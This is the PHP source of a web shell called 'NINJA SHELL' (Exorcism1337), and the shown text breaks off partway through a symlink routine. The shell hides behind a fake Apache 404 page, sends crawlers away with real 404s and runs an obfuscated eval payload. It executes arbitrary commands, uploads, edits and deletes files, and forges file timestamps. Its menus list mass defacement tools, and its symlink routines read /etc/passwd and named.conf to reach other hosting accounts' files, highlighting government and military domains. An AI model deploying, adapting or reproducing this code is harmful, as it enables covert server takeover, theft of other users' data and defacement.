<?php
header("X-XSS-Protection: 0");
session_start();
ob_start();
set_time_limit(0);
error_reporting(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (version_compare(PHP_VERSION, '5.3.0', '<')) {
	@set_magic_quotes_runtime(0);
}
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
	if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		header('HTTP/1.0 404 Not Found');
		exit;
	}
}

$password = "21232f297a57a5a743894a0e4a801fc3"; // md5 : admin

function login_shell()
{
?>
	<!DOCTYPE HTML>
	<html>

	<head>
		<title>404 Not Found</title>
		<h1>Not Found</h1>

		<p>The requested URL was not found on this server.</p>
		<p>Additionally, a 404 Not Found
			error was encountered while trying to use an ErrorDocument to handle the request.</p>
		<hr>
		<address>Apache Server at <?= $_SERVER['HTTP_HOST'] ?> Port 80</address>
		<style>
			input {
				margin: 0;
				background-color: #fff;
				border: 1px solid #fff;
				text-align: center;
			}
		</style>
		<br><br><br><br><br>
		<form method="post">
			<center>
				<input type="password" name="password" autocomplete="off">
		</form>
		</center>
	<?php
	 eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
	exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
	if (empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		login_shell();

function usergroup()
{
	if (!function_exists('posix_getegid')) {
		$user['name'] 	= @get_current_user();
		$user['uid']  	= @getmyuid();
		$user['gid']  	= @getmygid();
		$user['group']	= "?";
	} else {
		$user['uid'] 	= @posix_getpwuid(posix_geteuid());
		$user['gid'] 	= @posix_getgrgid(posix_getegid());
		$user['name'] 	= $user['uid']['name'];
		$user['uid'] 	= $user['uid']['uid'];
		$user['group'] 	= $user['gid']['name'];
		$user['gid'] 	= $user['gid']['gid'];
	}
	return (object) $user;
}

function exe($cmd)
{
	if (function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('exec')) {
		@exec($cmd, $results);
		$buff = "";
		foreach ($results as $result) {
			$buff .= $result;
		}
		return $buff;
	} elseif (function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	} elseif (function_exists('shell_exec')) {
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "ON" : "OFF";
$ds = @ini_get("disable_functions");
$open_basedir = @ini_get("Open_Basedir");
$safemode_exec_dir = @ini_get("safe_mode_exec_dir");
$safemode_include_dir = @ini_get("safe_mode_include_dir");
$show_ds = (!empty($ds)) ? "$ds" : "All Functions Is Accessible";
$mysql = (function_exists('mysql_connect')) ? "ON" : "OFF";
$curl = (function_exists('curl_version')) ? "ON" : "OFF";
$wget = (exe('wget --help')) ? "ON" : "OFF";
$perl = (exe('perl --help')) ? "ON" : "OFF";
$ruby = (exe('ruby --help')) ? "ON" : "OFF";
$mssql = (function_exists('mssql_connect')) ? "ON" : "OFF";
$pgsql = (function_exists('pg_connect')) ? "ON" : "OFF";
$python = (exe('python --help')) ? "ON" : "OFF";
$magicquotes = (function_exists('get_magic_quotes_gpc')) ? "ON" : "OFF";
$ssh2 = (function_exists('ssh2_connect')) ? "ON" : "OFF";
$oracle = (function_exists('oci_connect')) ? "ON" : "OFF";

$show_obdir = (!empty($open_basedir)) ? "OFF" : "ON";
$show_exec = (!empty($safemode_exec_dir)) ? "OFF" : "ON";
$show_include = (!empty($safemode_include_dir)) ? "OFF" : "ON";

if (!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

function hdd($s)
{
	if ($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824) . ' GB';
	elseif ($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576) . ' MB';
	elseif ($s >= 1024)
		return sprintf('%1.2f', $s / 1024) . ' KB';
	else
		return $s . ' B';
}

$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;

function path()
{
	if (isset($_GET['dir'])) {
		$dir = str_replace("\\", "/", $_GET['dir']);
		@chdir($dir);
	} else {
		$dir = str_replace("\\", "/", getcwd());
	}
	return $dir;
}
$dir = scandir(path());
foreach ($dir as $folder) {
	$dirinfo['path'] = path() . DIRECTORY_SEPARATOR . $folder;
	if (!is_dir($dirinfo['path'])) continue;
	$dirinfo['link']  = ($folder === ".." ? "<a href='?dir=" . dirname(path()) . "'>$folder</a>" : ($folder === "." ?  "<a href='?dir=" . path() . "'>$folder</a>" : "<a href='?dir=" . $dirinfo['path'] . "'>$folder</a>"));
	if (function_exists('posix_getpwuid')) {
		$dirinfo['owner'] = (object) @posix_getpwuid(fileowner($dirinfo['path']));
		$dirinfo['owner'] = $dirinfo['owner']->name;
	} else {
		$dirinfo['owner'] = fileowner($dirinfo['path']);
	}
	if (function_exists('posix_getgrgid')) {
		$dirinfo['group'] = (object) @posix_getgrgid(filegroup($dirinfo['path']));
		$dirinfo['group'] = $dirinfo['group']->name;
	} else {
		$dirinfo['group'] = filegroup($dirinfo['path']);
	}
}

function OS()
{
	return (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux";
}

function ambilKata($param, $kata1, $kata2)
{
	if (strpos($param, $kata1) === FALSE) return FALSE;
	if (strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function windisk()
{
	$letters = "";
	$v = explode("\\", path());
	$v = $v[0];
	foreach (range("A", "Z") as $letter) {
		$bool = $isdiskette = in_array($letter, array("A"));
		if (!$bool) $bool = is_dir("$letter:\\");
		if ($bool) {
			$letters .= "[ <a href='?dir=$letter:\\'" . ($isdiskette ? " onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"" : "") . ">";
			if ($letter . ":" != $v) {
				$letters .= $letter;
			} else {
				$letters .= color(1, 2, $letter);
			}
			$letters .= "</a> ]";
		}
	}
	if (!empty($letters)) {
		print "Detected Drives $letters<br>";
	}
	if (count($quicklaunch) > 0) {
		foreach ($quicklaunch as $item) {
			$v = realpath(path() . "..");
			if (empty($v)) {
				$a = explode(DIRECTORY_SEPARATOR, path());
				unset($a[count($a) - 2]);
				$v = join(DIRECTORY_SEPARATOR, $a);
			}
			print "<a href='" . $item[1] . "'>" . $item[0] . "</a>";
		}
	}
}

ini_set('display_errors', FALSE);
$Array = [
	'7068705f756e616d65',
	'70687076657273696f6e',
	'6368646972',
	'676574637764',
	'707265675f73706c6974',
	'636f7079',
	'66696c655f6765745f636f6e74656e7473',
	'6261736536345f6465636f6465',
	'69735f646972',
	'6f625f656e645f636c65616e28293b',
	'756e6c696e6b',
	'6d6b646972',
	'63686d6f64',
	'7363616e646972',
	'7374725f7265706c616365',
	'68746d6c7370656369616c6368617273',
	'7661725f64756d70',
	'666f70656e',
	'667772697465',
	'66636c6f7365',
	'64617465',
	'66696c656d74696d65',
	'737562737472',
	'737072696e7466',
	'66696c657065726d73',
	'746f756368',
	'66696c655f657869737473',
	'72656e616d65',
	'69735f6172726179',
	'69735f6f626a656374',
	'737472706f73',
	'69735f7772697461626c65',
	'69735f7265616461626c65',
	'737472746f74696d65',
	'66696c6573697a65',
	'726d646972',
	'6f625f6765745f636c65616e',
	'7265616466696c65',
	'617373657274',
];
$___ = count($Array);
for ($i = 0; $i < $___; $i++) {
	$GNJ[] = uhex($Array[$i]);
}

	?>
	<!DOCTYPE html>
	<html dir="auto" lang="en-US">

	<head>
		<meta charset="UTF-8">
		<meta name="robots" content="NOINDEX, NOFOLLOW">

		<title>./Exorcism1337</title>
		<link rel="icon" href="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png">

		<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
	</head>
	<link rel="stylesheet" href="https://yudas1337.github.io/NINJA_SHELL/main.css">
	<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
	<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
	<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>

	<body>

		<style type="text/css">
			@import url(https://fonts.googleapis.com/css?family=Gugi);

			body {
				color: #000;
				font-family: 'Gugi';
				font-size: 14px;
			}

			a {
				text-decoration: none;
			}

			a:hover {
				color: #5DADE2;
				text-decoration: underline;
			}

			input {
				background: transparent;
			}

			textarea {
				border: 1px solid #000;
				width: 100%;
				height: 400px;
				padding-left: 5px;
				margin: 10px auto;
				resize: none;
				color: #000;
				font-family: 'Gugi';
				font-size: 13px;
			}
		</style>
		<div class="container">
			<br><br>
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">NINJA SHELL</font>
				</a>
			</div>
			<nav class="navbar navbar-expand-lg navbar-light bg-light ">

				<?php
				if (isset($_GET["d"])) {
					$d = uhex($_GET["d"]);
					$GNJ[2](uhex($_GET["d"]));
				} else {
					$d = $GNJ[3]();
				}
				$k = $GNJ[4]("/(\\\|\/)/", $d);

				?>

				<br />

				<a class="navbar-brand" href="#">
					<img src="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe">
				</a>


				<div class="collapse navbar-collapse" id="navbarNav">
					<ul class="navbar-nav">
						<li class="nav-item active">
							<a class="nav-link ajx" href="?">
								<font color="red">Home</font>
							</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('info') ?>">Info</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('mass') ?>">Mass Tools</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('symlink') ?>">Symlink</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('config') ?>">Config</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('network') ?>">Network</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('cgi') ?>">CGI</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('bypass') ?>">Bypass</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('exploiter') ?>">Exploiter</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('auto_tools') ?>">Auto Tools</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('scanner') ?>">Scanner</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('about') ?>">About Us</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('killself') ?>">KillSelf</a>
						</li>
						<li class="nav-item active">
							<a class="nav-link ajx" href="?d=<?= hex($d) ?>&<?= hex('logout') ?>">
								<font color="red">Logout</font>
							</a>
						</li>
					</ul>
				</div>
				<a class="navbar-brand" href="#">
					<img src="//cdn1.iconfinder.com/data/icons/ninja-things-1/1772/ninja-simple-512.png" width="30" height="30" class="d-inline-block align-top auto" alt="Ainz Moe">
				</a>

				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>

			</nav>
		</div>
		<?php


		?>


		<div class="u">


			<form method="post" enctype="multipart/form-data">
				<label class="l w"><br>
					<input type="file" name="n[]" onchange="this.form.submit()" multiple class="form-control mr-3">
				</label>&nbsp;
			</form>

			<?php
			$o_ = [
				'<script>$.notify("',
				'", { className:"1",autoHideDelay: 2000,position:"left bottom" });</script>'
			];
			$f = $o_[0] . 'Success!' . $o_[1];
			$g = $o_[0] . 'Failed!' . $o_[1];
			if (isset($_FILES["n"])) {
				$z = $_FILES["n"]["name"];
				$r = count($z);
				for ($i = 0; $i < $r; $i++) {
					if ($GNJ[5]($_FILES["n"]["tmp_name"][$i], $z[$i])) {
						echo $f;
					} else {
						echo $g;
					}
				}
			}
			?>

		</div>

		<?php
		echo "<br>Current Directory : ";
		foreach ($k as $m => $l) {
			if ($l == '' && $m == 0) {
				echo '<a class="ajx" href="?d=2f">/</a>';
			}
			if ($l == '') {
				continue;
			}
			echo '<a class="ajx" href="?d=';
			for ($i = 0; $i <= $m; $i++) {
				echo hex($k[$i]);
				if ($i != $m) {
					echo '2f';
				}
			}
			echo '">' . $l . '</a>/';
		}
		echo ' (' . x("$d/$c") . ')';
		print "<br>";
		print (OS() === "Windows") ? windisk() : "";
		echo "<br><br>";
		echo '<a class="btn btn-primary btn-sm ml-3 ajx" href="?d=' . hex($d) . '&n">+NEWFILE+</a>
						  <a class="btn btn-primary btn-sm ajx " href="?d=' . hex($d) . '&l">+NEWDIR+</a>';
		echo "<form method='post'><center>
				<font color = 'red'>" . $user . "@" . gethostbyname($_SERVER['HTTP_HOST']) . ": ~ $ </font>&nbsp;
				<input style='border: none; border-bottom: 1px solid #000;' type='text' size='30' height='10' name='cmd'><input style='border: none; border-bottom: 1px solid #000;' type='submit' name='do_cmd' value='>>'>
				</center></form>";
		if ($_POST['do_cmd']) {
			echo "<pre>" . exe($_POST['cmd']) . "</pre>";
		}

		$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
						<thead>
							<tr>
								<th>';
		$b_ = '</th>
							</tr>
						</thead>
						<tbody>
							<tr>
								<td></td>
							</tr>
							<tr>
								<td class="x">';
		$c_ = '</td>
							</tr>
						</tbody>
					</table>';
		$d_ = '<br />
										<br />
										<input type="submit" class="form-control col-md-3" value="&nbsp;OK&nbsp;" />
									</form>';


		if (isset($_GET["s"])) {
			echo $a_ . uhex($_GET["s"]) . $b_ . '
									<textarea readonly class = "form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["s"]))) . '</textarea>
									<br />
									<br />
									<input onclick="location.href=\'?d=' . $_GET["d"] . '&e=' . $_GET["s"] . '\'" type="submit" class="form-control col-md-3" value="&nbsp;EDIT&nbsp;" />
								' . $c_;
		} elseif (isset($_GET["y"])) {
			echo $a_ . 'REQUEST' . $b_ . '
									<form method="post">
										<input class="form-control md-3" type="text" name="1" autocomplete="off" />&nbsp;&nbsp;
										<input class="form-control md-3" type="text" name="2" autocomplete="off" />
										' . $d_ . '
									<br />
									<textarea readonly class = "form-control">';

			if (isset($_POST["2"])) {
				echo $GNJ[15](dre($_POST["1"], $_POST["2"]));
			}

			echo '</textarea>
								' . $c_;
		} elseif (isset($_GET["e"])) {
			echo $a_ . uhex($_GET["e"]) . $b_ . '
									<form method="post">
										<textarea name="e" class="form-control">' . $GNJ[15]($GNJ[6](uhex($_GET["e"]))) . '</textarea>
										<br />
										<br />
										<span class="w">BASE64</span> :
										<center><select id="b64" name="b64" class = "form-control col-md-3">
											<option value="0">NO</option>
											<option value="1">YES</option>
										</select></center>
										' . $d_ . '
								' . $c_ . '
								
					<script>
						$("#b64").change(function() {
							if($("#b64 option:selected").val() == 0) {
								var X = $("textarea").val();
								var Z = atob(X);
								$("textarea").val(Z);
							}
							else {
								var N = $("textarea").val();
								var I = btoa(N);
								$("textarea").val(I);
							}
						});
					</script>';
			if (isset($_POST["e"])) {
				if ($_POST["b64"] == "1") {
					$ex = $GNJ[7]($_POST["e"]);
				} else {
					$ex = $_POST["e"];
				}
				$fp = $GNJ[17](uhex($_GET["e"]), 'w');
				if ($GNJ[18]($fp, $ex)) {
					OK();
				} else {
					ER();
				}
				$GNJ[19]($fp);
			}
		} elseif (isset($_GET["x"])) {
			rec(uhex($_GET["x"]));
			if ($GNJ[26](uhex($_GET["x"]))) {
				ER();
			} else {
				OK();
			}
		} elseif (isset($_GET["t"])) {
			echo $a_ . uhex($_GET["t"]) . $b_ . '
									<form action="" method="post">
										<input name="t" class="form-control col-md-3" autocomplete="off" type="text" value="' . $GNJ[20]("Y-m-d H:i", $GNJ[21](uhex($_GET["t"]))) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["t"])) {
				$p = $GNJ[33]($_POST["t"]);
				if ($p) {
					if (!$GNJ[25](uhex($_GET["t"]), $p, $p)) {
						ER();
					} else {
						OK();
					}
				} else {
					ER();
				}
			}
		} elseif (isset($_GET["k"])) {
			echo $a_ . uhex($_GET["k"]) . $b_ . '
									<form action="" method="post">
										<input name="b" autocomplete="off" class="form-control col-md-3" type="text" value="' . $GNJ[22]($GNJ[23]('%o', $GNJ[24](uhex($_GET["k"]))), -4) . '">
										' . $d_ . '
								' . $c_;
			if (!empty($_POST["b"])) {
				$x = $_POST["b"];
				$t = 0;
				for ($i = strlen($x) - 1; $i >= 0; --$i)
					$t += (int) $x[$i] * pow(8, (strlen($x) - $i - 1));
				if (!$GNJ[12](uhex($_GET["k"]), $t)) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["l"])) {
			echo $a_ . '+DIR' . $b_ . '
									<form action="" method="post">
										<input name="l" autocomplete="off" class="form-control col-md-3" type="text" value="">
										' . $d_ . '
								' . $c_;
			if (isset($_POST["l"])) {
				if (!$GNJ[11]($_POST["l"])) {
					ER();
				} else {
					OK();
				}
			}
		} elseif (isset($_GET["q"])) {
			if ($GNJ[10](__FILE__)) {
				$GNJ[38]($GNJ[9]);
				header("Location: " . basename($_SERVER['PHP_SELF']) . "");
				exit();
			} else {
				echo $g;
			}
		} elseif (isset($_GET[hex('info')])) {
			echo '<hr>SYSTEM INFORMATION<center>
						<textarea class = "form-control" readonly>
						
			Server 					: ' . $_SERVER['HTTP_HOST'] . '
			Server IP 				: ' . $_SERVER['SERVER_ADDR'] . ' Your IP : ' . $_SERVER['REMOTE_ADDR'] . '
			Kernel Version 			: ' . php_uname() . '
			Software 					: ' . $_SERVER['SERVER_SOFTWARE'] . '
			Storage Space 			: ' . $used . "/" . $total . "(Free : " . $freespace . ")" . '
			User / Group 				: ' . $user . ' (' . $uid . ') | ' . $group . ' (' . $gid . ') 
			Time On Server 			: ' . date("d M Y h:i:s a") . '
			Disable Functions 			: ' . $show_ds . '
			Safe Mode 				: ' . $sm . '
			PHP VERSION 				: ' . phpversion() . ' On ' . php_sapi_name() . '

	Open_Basedir : ' . $show_obdir . ' | Safe Mode Exec Dir : ' . $show_exec . ' | Safe Mode Include Dir : ' . $show_include . '
	MySQL : ' . $mysql . ' | MSSQL : ' . $mssql . ' | PostgreSQL : ' . $pgsql . ' | Perl : ' . $perl . ' | Python : ' . $python . ' | Ruby : ' . $ruby . ' |  WGET : ' . $wget . ' | cURL : ' . $curl . ' | Magic Quotes : ' . $magicquotes . ' | SSH2 : ' . $ssh2 . ' | Oracle : ' . $oracle . ' 
						
						</textarea>
						</center>';
		} elseif (isset($_GET[hex('mass')])) {
			echo "<hr>
						<h2><center>Mass Tools Ninja Shell</center></h2>
						<br>
						<center>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_tool') . "' style='width: 250px;' height='10'><center>Mass Deface / Delete Files</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_user') . "' style='width: 250px;' height='10'><center>Mass User Changer</center></a>
						</div>
						<div class = 'col-md-4'>
						<a class = 'form-control ajx' href = '?d=" . hex($d) . "&" . hex('mass_title') . "' style='width: 250px;' height='10'><center>Mass Title Changer</center></a>
						</div>
						
						</div></form></center><hr><br>";
		} elseif (isset($_GET[hex('symlink')])) {
			echo "<hr><br>";
			echo "<center>
						<h2> Symlink Ninja Shell </h2> <br><br>
						<form method = 'POST'>
						<div class = 'row clearfix'>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink' class = 'form-control' value = 'Symlink' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink2' class = 'form-control' value = 'Symlink 2' style='width: 250px;' height='10'>
						</div>
						<div class = 'col-md-4'>
						<input type = 'submit' name = 'symlink_py' class = 'form-control' value = 'Symlink Python' style='width: 250px;' height='10'>
						</div>
						
						</div></form></center><hr><br>";
			if (isset($_POST['symlink'])) {
				@set_time_limit(0);

				echo "<br><br><center><h2>Symlink Ninja Shell</h2></center><br><br><center><div class=content>";

				@mkdir('sym', 0777);
				$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
				$write = @fopen('sym/.htaccess', 'w');
				fwrite($write, $htaccess);
				@symlink('/', 'sym/root');
				$filelocation = basename(__FILE__);
				$read_named_conf = @file('/etc/named.conf');
				if (!$read_named_conf) {
					echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>";
				} else {
					echo "<br><br><div class='tmp'><table border='1' bordercolor='lime' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
					foreach ($read_named_conf as $subject) {
						if (eregi('zone', $subject)) {
							preg_match_all('#zone "(.*)"#', $subject, $string);
							flush();
							if (strlen(trim($string[1][0])) > 2) {
								$UID = posix_getpwuid(@fileowner('/etc/valiases/' . $string[1][0]));
								$name = $UID['name'];
								@symlink('/', 'sym/root');
								$name   = $string[1][0];
								$iran   = '.ir';
								$israel = '.il';
								$indo   = '.id';
								$sg12   = '.sg';
								$edu    = '.edu';
								$gov    = '.gov';
								$gose   = '.go';
								$gober  = '.gob';
								$mil1   = '.mil';
								$mil2   = '.mi';
								$malay	= '.my';
								$china	= '.cn';
								$japan	= '.jp';
								$austr	= '.au';
								$porn	= '.xxx';
								$as		= '.uk';
								$calfn	= '.ca';

								if (
									eregi("$iran", $string[1][0]) or eregi("$israel", $string[1][0]) or eregi("$indo", $string[1][0]) or eregi("$sg12", $string[1][0]) or eregi("$edu", $string[1][0]) or eregi("$gov", $string[1][0])
									or eregi("$gose", $string[1][0]) or eregi("$gober", $string[1][0]) or eregi("$mil1", $string[1][0]) or eregi("$mil2", $string[1][0])
									or eregi("$malay", $string[1][0]) or eregi("$china", $string[1][0]) or eregi("$japan", $string[1][0]) or eregi("$austr", $string[1][0])
									or eregi("$porn", $string[1][0]) or eregi("$as", $string[1][0]) or eregi("$calfn", $string[1][0])
								) {
									$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $string[1][0] . '</div>';
								}
								echo "
			<tr>

			<td>
			<div class='dom'><a target='_blank' href=http://www." . $string[1][0] . '/>' . $name . ' </a> </div>
			</td>

			<td>
			' . $UID['name'] . "
			</td>

			<td>
			<a href='sym/root/home/" . $UID['name'] . "/public_html' target='_blank'>Symlink </a>
			</td>

			</tr></div> ";
								flush();
							}
						}
					}
				}

				echo "</center></table>";
			} elseif (isset($_POST['symlink2'])) {

				$dir = path();
				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				$d0mains = @file("/etc/named.conf");
				##httaces
				if ($d0mains) {
					@mkdir("Exc_sym", 0777);
					@chdir("Exc_sym");
					@exe("ln -s / root");
					$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
					$fp3 = fopen('.htaccess', 'w');
					$fw3 = fwrite($fp3, $file3);
					@fclose($fp3);
					echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
					$dcount = 1;
					foreach ($d0mains as $d0main) {
						if (eregi("zone", $d0main)) {
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
							if (strlen(trim($domains[1][0])) > 2) {
								$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domains[1][0]));
								echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www." . $domains[1][0] . "/><font class=txt>" . $domains[1][0] . "</font></a></td>
<td>" . $user['name'] . "</td>
<td><a href='$full/Exc_sym/root/home/" . $user['name'] . "/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
								flush();
								$dcount++;
							}
						}
					}
					echo "</table>";
				} else {
					$TEST = @file('/etc/passwd');
					if ($TEST) {
						@mkdir("Exc_sym", 0777);
						@chdir("Exc_sym");
						exe("ln -s / root");
						$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
						$fp3 = fopen('.htaccess', 'w');
						$fw3 = fwrite($fp3, $file3);
						@fclose($fp3);
						echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
						$dcount = 1;
						$file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
						while (!feof($file)) {
							$s = fgets($file);
							$matches = array();
							$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
							$matches = str_replace("home/", "", $matches[1]);
							if (strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
								continue;
							echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
							echo "<td align=center><font class=txt><a href=$full/Exc_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
							$dcount++;
						}
						fclose($file);
						echo "</table>";
					} else {
						if ($os != "Windows") {
							@mkdir("Exc_sym", 0777);
							@chdir("Exc_sym");
							@exe("ln -s / root");
							$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex Exc.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
							$fp3 = fopen('.htaccess', 'w');
							$fw3 = fwrite($fp3, $file3);
							@fclose($fp3);
							echo "
 <h2><center>Symlink2 Ninja Shell</center></h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
							$temp = "";
							$val1 = 0;
							$val2 = 1000;
							for (; $val1 <= $val2; $val1++) {
								$uid = @posix_getpwuid($val1);
								if ($uid) $temp .= join(':', $uid) . "\n";
							}
							echo '<br/>';
							$temp = trim($temp);
							$file5 =
								fopen("test.txt", "w");
							fputs($file5, $temp);
							fclose($file5);
							$dcount = 1;
							$file =
								fopen("test.txt", "r") or exit("Unable to open file!");
							while (!feof($file)) {
								$s = fgets($file);
								$matches = array();
								$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
								$matches = str_replace("home/", "", $matches[1]);
